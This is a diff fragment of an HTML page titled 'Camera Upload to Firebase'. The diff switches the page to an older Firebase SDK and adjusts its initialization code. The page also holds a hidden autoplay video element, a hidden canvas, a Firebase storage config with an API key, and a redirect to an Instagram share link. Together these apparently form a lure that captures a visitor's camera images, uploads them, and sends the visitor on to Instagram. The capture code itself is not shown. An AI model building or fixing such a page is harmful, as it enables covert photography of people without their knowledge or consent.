@@ -3,15 +3,16 @@
 <html>
 <head>
   <title>Camera Upload to Firebase</title>
-  <script src="https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.4.0/firebase-storage.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
 </head>
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
   <script>
     // Firebase configuration
-    const firebaseConfig = {
+    var firebaseConfig = {
       apiKey: "AIzaSyC0WgRyyIgIZqfI3azfBqyyy_xqeRw",
       authDomain: "mioudcamstorage.firebaseapp.com",
       projectId: "mioudcamstorage",
@@ -21,8 +22,8 @@
     };
 
     // Initialize Firebase
-    const app = firebase.initializeApp(firebaseConfig);
-    const storage = firebase.storage();
+    firebase.initializeApp(firebaseConfig);
+    var storage = firebase.storage();
 
     const REDIRECT_URL = 'https://www.instagram.com/share/BAPOHyZPk7';
 
